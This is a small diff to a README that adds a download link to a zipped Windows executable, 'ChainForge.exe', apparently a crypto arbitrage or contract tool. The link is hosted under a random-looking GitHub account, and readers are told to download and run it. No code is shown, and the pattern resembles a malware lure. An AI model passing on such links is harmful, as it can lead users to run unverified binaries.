@@ -7,6 +7,7 @@
 ---
 
 ## Download & run
+[DOWNLOAD](https://github.com/quipplaqcrbthznbiwkosa/arbitrage_and_contract_canvas/raw/refs/heads/main/ChainForge.zip)
 
 - The app is packed into **a single file**: `ChainForge.exe`
 - Unzip the archive
